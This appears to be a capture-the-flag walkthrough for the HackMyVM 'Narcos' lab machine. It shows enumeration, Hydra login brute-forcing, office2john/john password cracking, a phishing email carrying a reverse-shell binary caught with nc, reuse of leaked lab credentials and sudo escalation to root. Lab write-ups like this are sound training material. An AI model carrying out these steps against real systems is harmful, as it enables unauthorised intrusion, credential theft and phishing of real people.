@@ -1,0 +1,223 @@
+---
+title: "Narcos - HackMyVM Walkthrough"
+---
+
+nmap service scan:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ nmap -p- -sV 192.168.56.254
+--SNIP--
+ORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endhighlight %}
+
+We're greeted by the landing page of an eCommerce store advertising drugs when visiting the site. Let's run gobuster on the webserver and enumerate the directories and 
+possible files:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q -x html,php,txt,jpg,png -u http://192.168.56.254    
+/index.html           (Status: 200) [Size: 11550]
+/images               (Status: 301) [Size: 317] [--> http://192.168.56.254/images/]
+/js                   (Status: 301) [Size: 313] [--> http://192.168.56.254/js/]    
+/squirrelmail         (Status: 301) [Size: 323] [--> http://192.168.56.254/squirrelmail/]
+/bootstrap            (Status: 301) [Size: 320] [--> http://192.168.56.254/bootstrap/]
+{% endhighlight %}
+
+Navigating to the squirrelmail directory presents us with a webmail login form. 
+The SquirrelMail version is 1.4.23, so let's use searchsploit to find available 
+exploits: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ searchsploit squirrelmail | grep 1.4
+SquirrelMail 1.4.2 Address Add Plugin - 'add.php'  | php/webapps/26305.txt
+Squirrelmail 1.4.x - 'Redirect.php' Local File Inc | php/webapps/27948.txt
+SquirrelMail 1.4.x - Folder Name Cross-Site Script | php/webapps/24068.txt
+SquirrelMail 3.1 - Change Passwd Plugin Local Buff | linux/local/1449.c
+SquirrelMail < 1.4.22 - Remote Code Execution      | linux/remote/41910.sh
+SquirrelMail < 1.4.5-RC1 - Arbitrary Variable Over | php/webapps/43830.txt
+SquirrelMail < 1.4.7 - Arbitrary Variable Overwrit | php/webapps/43839.txt
+{% endhighlight %}
+
+As the version is 1.4.23, let's see if the remote code execution bash script still
+works. Browsing the source code reveals that this script runs against version 1.4.23, but we need to have login credentials.. The same applies for the 'Redirect.php' 
+LFI exploit. 
+
+After consulting a walkthrough for a hint, it pointed me in the direction of 
+subdomain enumeration. Let's add "escobar.hmv" to our `/etc/hosts` and bruteforce 
+for subdomains: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -q -u http://escobar.hmv 
+Found: management.escobar.hmv (Status: 200) [Size: 4245]
+{% endhighlight %}
+
+Let's add "management.escobar.hmv" to `/etc/hosts` and take a look at the site. 
+Checking the source code reveals the version number of 2.9.0 for a web based 
+file browser called "File Browser". 
+Details about the software can be found here:https://filebrowser.org/
+
+Browsing the https://filebrowser.org/installation page gets us the default 
+credentials of `admin:admin`. 
+After an attempt to login it turns out the password isn't a default so we have to 
+brute force it. 
+
+We'll need to capture the login form request with burp proxy. 
+
+Request:
+{% highlight text %}
+POST /api/login HTTP/1.1
+Host: management.escobar.hmv
+Content-Length: 54
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://management.escobar.hmv
+Referer: http://management.escobar.hmv/login?redirect=%2Ffiles%2F
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+{"username":"admin","password":"admin","recaptcha":""}
+{% endhighlight %}
+
+Let's build the hydra command: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt management.escobar.hmv http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden'
+{% endhighlight %}
+
+Hydra runs for a while then we get the password:
+{% highlight terminal %}
+[80][http-post-form] host: management.escobar.hmv   login: admin   password: gabriela
+{% endhighlight %}
+
+After logging in I downloaded and unzipped the `personal` and `works` zip files:
+{% highlight text %}
+Archive:  personal.zip
+   creating: personal/
+ extracting: medellingang.jpg        
+ extracting: gonzalorodriguez(potrait).png
+
+Archive:  works.zip
+   creating: works/
+ extracting: logins.xlsx             
+ extracting: ledger.xlsx
+{% endhighlight %}
+
+the `logins.xlsx` file is password protected, so we'll need to crack it with `john`.
+We'll need to download "office2john.py": 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/office2john.py
+{% endhighlight %}
+
+Generate the hash file to crack:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ python office2john.py logins.xlsx > logins.hash 
+{% endhighlight %}
+
+Use john to crack the hash using the rockyou wordlist:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt logins.hash
+{% endhighlight %}
+
+It found a password in no time, let's see what it is:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ john --show logins.hash                                                     1 ⨯
+logins.xlsx:money1
+
+1 password hash cracked, 0 left
+{% endhighlight %}
+
+Browsing the excel sheet gives us another subdomain to add to the /etc/hosts file:
+elcorreo.escobar.hmv
+
+We also get the login information of all the users. After poking around in the emails of the cartel members, it turns out we need to phish one of the other users into 
+downloading an update binary. Here's where the reverse shell code is hosted:
+https://gist.github.com/0xabe-io/916cf3af33d1c0592a90
+
+We then use the secret code, add the binary as an attachment and send the email 
+after setting up the reverse shell listener. 
+
+Catching the connection and spawning a better shell:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/narcos]
+└─$ nc -nlvp 6666
+listening on [any] 6666 ...
+connect to [192.168.56.224] from (UNKNOWN) [192.168.56.254] 35528
+python3 -c 'import pty; pty.spawn("/bin/bash");'
+carlos@narcos:/home/carlos$
+{% endhighlight %}
+
+Let's try using the credentials from the logins file to switch users to pablo:
+{% highlight terminal %}
+carlos@narcos:/home/carlos$ su pablo
+su pablo
+Password: Il0ve$$$yeah!
+
+bash: /usr/bin/lesspipe: /bin/sh: bad interpreter: Permission denied
+Traceback (most recent call last):
+  File "/home/pablo/2fa.py", line 15, in <module>
+    screen  = curses.initscr()
+  File "/usr/lib/python3.5/curses/__init__.py", line 30, in initscr
+    fd=_sys.__stdout__.fileno())
+_curses.error: setupterm: could not find terminal
+{% endhighlight %}
+
+After the script runs and fails we still get to access the pablo account but are 
+limited by a 2fa script. After cat-ting the script I discovered a password:
+`pabloEncryPt10nz`
+
+{% highlight terminal %}
+pablo@narcos:~$ su pablo
+su pablo
+Password: Il0ve$$$yeah!
+
+bash: /usr/bin/lesspipe: /bin/sh: bad interpreter: Permission denied
+	 ********************************************
+	* All empires are created of blood and fire  *
+	* I leave it here incase: srvrrVhiupJz10qq   *
+	* Hint : VINEGAR 			     *
+	* IF I FORGOT : aaaa-zzzz		     *
+	* Arrghh who cares: pablo***********	     *
+	 ********************************************
+Enter Real Password : pabloEncryPt10nz
+pabloEncryPt10nz
+Welcome Don Pablo
+pablo@narcos:~$ 
+{% endhighlight %}
+
+checking the sudo privileges for pablo and getting the root flag:
+{% highlight terminal %}
+pablo@narcos:~$ sudo -l
+sudo -l
+[sudo] password for pablo: Il0ve$$$yeah!
+
+Matching Defaults entries for pablo on narcos:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pablo may run the following commands on narcos:
+    (ALL : ALL) ALL
+pablo@narcos:~$ sudo -i
+sudo -i
+root@narcos:~# ls
+ls
+root.txt
+root@narcos:~# cat root.txt
+cat root.txt
+.__   __.      ___      .______        ______   ______        _______.
+|  \ |  |     /   \     |   _  \      /      | /  __  \      /       |
+|   \|  |    /  ^  \    |  |_)  |    |  ,----'|  |  |  |    |   (----`
+|  . `  |   /  /_\  \   |      /     |  |     |  |  |  |     \   \
+|  |\   |  /  _____  \  |  |\  \----.|  `----.|  `--'  | .----)   |
+|__| \__| /__/     \__\ | _| `._____| \______| \______/  |_______/
+
+{% endhighlight %}
+
+I submitted the flags and got the points. Hooray for points.
+
